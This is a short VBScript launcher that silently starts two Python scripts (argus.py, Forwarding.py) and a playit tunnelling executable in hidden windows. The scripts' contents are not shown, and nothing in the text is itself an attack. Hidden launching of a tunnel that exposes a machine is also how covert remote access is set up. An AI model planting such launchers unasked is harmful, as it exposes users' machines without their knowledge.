CreateObject("Wscript.Shell").Run "pythonw.exe argus.py", 0, False
CreateObject("Wscript.Shell").Run "pythonw.exe Forwarding.py", 0, False
CreateObject("Wscript.Shell").Run "playit-windows-x86_64-signed.exe", 0, False
